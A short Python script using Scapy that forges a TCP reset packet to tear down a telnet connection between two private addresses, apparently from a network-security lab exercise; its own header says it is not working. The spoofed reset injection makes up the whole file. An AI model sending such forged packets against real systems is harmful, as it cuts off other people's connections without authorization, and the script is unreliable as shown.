#TCP RST Attack

#NOT WORKING

from scapy.all import *
from random import getrandbits


ip = IP(src = "10.9.0.6", dst="10.9.0.5") #dst = server, src = host with ask for reset
tcp = TCP(sport=34770, dport=23, flags="R", seq=460035831) # you need to sniff and set the sequence number manually here!
pkt = ip/tcp
ls(pkt)
send(pkt, iface='br-bab1907c5b24',verbose=0)